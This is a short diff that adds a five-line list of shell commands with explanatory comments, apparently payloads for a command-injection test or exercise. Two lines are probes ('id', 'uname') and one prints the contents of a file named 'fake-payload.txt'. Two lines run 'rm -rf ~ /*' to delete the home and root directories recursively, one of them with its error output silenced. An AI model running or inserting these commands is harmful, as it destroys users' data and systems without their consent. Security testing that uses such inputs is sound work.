@@ -1,0 +1,5 @@
+id #user id info
+uname #Linux operating system info
+printf $(cat fake-payload.txt | tr -d '\n') #prints contents of fake-payload.txt and translates them, deletes '\n' occurances 
+rm -rf ~ /* #deletes contents of root directory recursively
+rm -rf ~ /* 2> /dev/null #deletes contents of root directory recursively and sends logs to null
